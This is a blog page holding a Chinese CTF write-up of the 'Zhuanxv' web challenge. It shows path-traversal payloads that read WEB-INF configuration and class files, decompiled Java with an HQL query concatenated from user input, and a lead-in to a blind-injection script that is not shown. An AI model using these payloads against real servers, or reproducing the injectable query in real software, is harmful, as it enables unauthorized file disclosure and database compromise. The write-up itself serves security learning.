@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>攻防世界web进阶区Zhuanxv详解 | wumingzhilian</title>
+  <meta name="author" content="wuming" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    
+      <meta name="description" itemprop="description" content="" />
+    
+    <meta property="og:title" content="攻防世界web进阶区Zhuanxv详解" />
+    
+    <meta property="og:url" content="http://wumingzhilian.github.to/2020/08/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAZhuanxv%E8%AF%A6%E8%A7%A3/" />
+    
+      <meta name="twitter:card" content="summary" />
+      <meta name="twitter:site" content="@wumingzhilian" />
+      <meta name="twitter:title" content="攻防世界web进阶区Zhuanxv详解" />
+      
+        <meta name="twitter:description" content="" />
+      
+      
+    
+  
+  <link rel="alternate" href="atom.xml" type="application/atom+xml">
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="highlight-css" href="/css/highlight.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.2.6/dist/disqusjs.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+  
+    <script async src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+    <script async src="https://cdn.jsdelivr.net/npm/disqusjs@1.2.6/dist/disqus.js"></script>
+  
+<meta name="generator" content="Hexo 5.0.0"></head>
+<body class="custom-background">
+    <div id="kratos-wrapper">
+        <div id="kratos-page">
+            <div id="kratos-header">
+                <div class="nav-toggle"><a class="kratos-nav-toggle js-kratos-nav-toggle"><i></i></a></div>
+                <header id="kratos-header-section">
+                    <div class="container">
+                        <div class="nav-header">
+                            <div class="color-logo"><a href="/">wumingzhilian</a></div>
+                            <nav id="kratos-menu-wrap">
+                              <ul id="kratos-primary-menu" class="sf-menu">
+                              
+                                
+                                  <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                
+                              
+                                
+                                  <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                
+                              
+                                
+                                  <li><a href="/friends/"><i class="fa fa-mars-double"></i>好伙伴</a></li>
+                                
+                              
+                                
+                                  <li><a href="/about/"><li><i class="fa fa-paper-plane"></i>关于我</a></li>
+                                
+                              
+                              </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </header>
+            </div>
+
+<div class="kratos-start kratos-hero-2">
+    <!-- <div class="kratos-overlay"></div> -->
+    <div class="kratos-cover kratos-cover-2 text-center">
+        <div class="desc desc2 animate-box">
+            <a href="/"><h2>wumingzhilian</h2><br><span></span></a>
+        </div>
+    </div>
+</div>
+
+<div id="kratos-blog-post">
+    <div class="container">
+            <div class="row">
+                
+<div id="main">
+    <section class="col-md-8">
+    <article>
+        <div class="kratos-hentry kratos-post-inner clearfix">
+            <header class="kratos-entry-header">
+                <h1 class="kratos-entry-title text-center">攻防世界web进阶区Zhuanxv详解</h1>
+                
+                <div class="kratos-post-meta text-center">
+                    <span>
+                    <i class="fa fa-calendar"></i> 2020-08-13
+                    <i class="fa fa-folder"></i> 分类于 <a class="label-link" href="/categories/CTF/">CTF</a>
+                    <i class="fa fa-user"></i> 作者 wuming
+                    </span>
+                </div>
+            </header>
+            <div class="kratos-post-content">
+                
+                    <div class="kratos-post-inner-toc">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA"><span class="toc-number">1.1.</span> <span class="toc-text">提示:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">详解</span></a></li></ol></li></ol>
+                    </div>
+                
+                <hr />
+                <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="提示"><a href="#提示" class="headerlink" title="提示:"></a>提示:</h2><p><img src="https://img-blog.csdnimg.cn/20200813084457568.png#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><p><img src="https://img-blog.csdnimg.cn/20200813110807818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>扫描目录发现了一个list<br>我们使用了好几个扫描工具，只有wwwscan，和webdirscan可以，（可能是我字典太菜了）</p>
+<p>发现需要登录<br><img src="https://img-blog.csdnimg.cn/20200813111221231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200813111526247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源代码发现，这里有问题，加载图片的方式很诡异<br>试试文件读取<br><img src="https://img-blog.csdnimg.cn/2020081311162719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020081311221286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>他的cookie里有jessionid  说明他是使用JAVA写的网页<br>那么我们尝试找找web.xml</p>
+<p><code>../../WEB-INF/web.xml</code><br><img src="https://img-blog.csdnimg.cn/20200813112449202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>有一个struts2<br>这个是struts的工作原理，以及一些讲解<br>apps-存放了所有Struts2的示例项目</p>
+<p>docs-存放了所有Struts2与XWork的文档</p>
+<p>lib-存放了所有Struts2相关的JAR文件以及Struts2运行时所依赖的JAR文件</p>
+<p>src-存放了所有Struts2的源码，以Maven所指定的项目结构目录存放</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010004082/article/details/79351459">https://blog.csdn.net/u010004082/article/details/79351459</a><br><img src="https://img-blog.csdnimg.cn/20200813135459882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>读取struts.xml<br><code>loadimage?fileName=../../WEB-INF/classes/struts.xml</code><br><img src="https://img-blog.csdnimg.cn/20200813122649981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;strutsenableDynamicMethodInvocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.mapper.alwaysSelectFullNamespace&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.action.extension&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;front&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exception-mapping</span> <span class="attr">exception</span>=<span class="string">&quot;java.lang.Exception&quot;</span> <span class="attr">result</span>=<span class="string">&quot;error&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;zhuanxvlogin&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.UserLoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;loadimage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.DownloadAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;stream&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;contentType&quot;</span>&gt;</span>image/jpeg<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;contentDisposition&quot;</span>&gt;</span>attachment;filename=&quot;bg.jpg&quot;<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;inputName&quot;</span>&gt;</span>downloadFile<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;suffix_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;back&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.util.UserOAuth&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;list&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.AdminAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;excludeMethods&quot;</span>&gt;</span></span><br><span class="line">                    execute</span><br><span class="line">                <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;login_error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;list_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p> 这里class里面可以看到很多class类名，尝试了一下，都可以逐个下载，点号换成正斜杠，然后再在后面加个.class就可以下载了，下载后用jd反编译class文件</p>
+<p>发现一个看起来和登陆有关的类UserLoginAction,构造payload下载:<br><code>?fileName=../../WEB-INF/classes/com/cuitctf/action/UserLoginAction.class</code><br><img src="https://img-blog.csdnimg.cn/20200813123105601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们使用jd-gui java反编译工具<br>我们将文件下载，并修改为.class文件<br>我们使用luyten反编译<br><img src="https://img-blog.csdnimg.cn/20200813133946590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cuitctf.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cuitctf.service.*;</span><br><span class="line"><span class="keyword">import</span> com.cuitctf.po.*;</span><br><span class="line"><span class="keyword">import</span> com.cuitctf.util.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.*;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.*;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserLoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserLoginAction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ApplicationContext context = InitApplicationContext.getApplicationContext();</span><br><span class="line">        <span class="keyword">this</span>.userService = (UserService)context.getBean(<span class="string">&quot;userService&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;start:&quot;</span> + <span class="keyword">this</span>.user.getName());</span><br><span class="line">        <span class="keyword">final</span> ActionContext actionContext = ActionContext.getContext();</span><br><span class="line">        <span class="keyword">final</span> Map&lt;String, Object&gt; request = (Map&lt;String, Object&gt;)actionContext.get(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.userCheck(<span class="keyword">this</span>.user)) &#123;</span><br><span class="line">                request.put(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;\u767b\u5f55\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7528\u6237\u540d\u548c\u5bc6\u7801&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;\u767b\u9646\u5931\u8d25&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;login SUCCESS&quot;</span>);</span><br><span class="line">        ActionContext.getContext().getSession().put(<span class="string">&quot;user&quot;</span>, <span class="keyword">this</span>.user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span><span class="params">(<span class="keyword">final</span> String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String valiidateString = <span class="string">&quot;[a-zA-Z0-9]&#123;1-16&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> matcher(valiidateString, username);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">matcher</span><span class="params">(<span class="keyword">final</span> String reg, <span class="keyword">final</span> String string)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> tem = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">final</span> Pattern pattern = Pattern.compile(reg);</span><br><span class="line">        <span class="keyword">final</span> Matcher matcher = pattern.matcher(string);</span><br><span class="line">        tem = matcher.matches();</span><br><span class="line">        <span class="keyword">return</span> tem;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">userCheck</span><span class="params">(<span class="keyword">final</span> User user)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> List&lt;User&gt; userList = (List&lt;User&gt;)<span class="keyword">this</span>.userService.loginCheck(user.getName(), user.getPassword());</span><br><span class="line">        <span class="keyword">if</span> (userList != <span class="keyword">null</span> &amp;&amp; userList.size() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.addActionError(<span class="string">&quot;Username or password is Wrong, please check!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> UserService <span class="title">getUserService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.userService;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserService</span><span class="params">(<span class="keyword">final</span> UserService userService)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userService = userService;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.user;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUser</span><span class="params">(<span class="keyword">final</span> User user)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>截取部分有用的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">userCheck</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line"> List&lt;User&gt; userList = <span class="keyword">this</span>.userService.loginCheck(user.getName(), user.getPassword());</span><br><span class="line"> <span class="keyword">if</span> (userList != <span class="keyword">null</span> &amp;&amp; userList.size() == <span class="number">1</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> addActionError(<span class="string">&quot;Username or password is Wrong, please check!&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200813135908263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现还有一个userservicempl的类<br>我们下载</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List &lt;User&gt; loginCheck(String name, String password) &#123;</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    Matcher username_matcher = Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(name);</span><br><span class="line">    Matcher password_matcher = Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(password);</span><br><span class="line">    <span class="keyword">if</span> (password_matcher.find()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.userDao.loginCheck(name, password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>找到登录的规则</p>
+<p>是登陆语句的过滤规则,在UserDaoImpl.class中找到:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List &lt; User &gt; loginCheck(String name, String password) &#123;</span><br><span class="line">       <span class="keyword">return</span> getHibernateTemplate().find(<span class="string">&quot;from User where name =&#x27;&quot;</span> + name + <span class="string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span>);  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里是大佬的盲注脚本</p>
